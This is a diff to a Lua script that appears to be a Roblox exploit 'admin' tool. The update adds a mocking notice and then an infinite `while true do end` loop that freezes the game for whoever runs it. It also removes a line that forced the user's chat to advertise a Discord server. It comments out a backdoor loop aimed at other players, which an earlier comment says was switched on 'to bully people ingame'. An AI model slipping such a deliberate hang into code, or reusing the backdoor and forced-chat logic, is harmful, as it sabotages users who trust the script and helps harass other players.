@@ -3319,14 +3319,16 @@ end))
 -- [[ End ]] --
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: A4nyecN)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","dot_mp4 here, cyadmin has been completely fixed for the 11/9/20 upd",10,nil)
-ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new cord: 6BUAhZwA5V","All")
+notif("Newest Update","get off roblox for atleast today you addict. - Cy",10,nil)
+wait(20)
+while true do end
+--notif("Newest Update","dot_mp4 here, cyadmin has been completely fixed for the 11/9/20 upd",10,nil)
 
-while wait(8) do
+--[[while wait(8) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
 		if PlrFinder(i) == LP or typeof(PlrFinder(i)) == "table" then
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end -- I uncommented this because I want to bully people ingame
+end -- banned on the webhost again lol]]
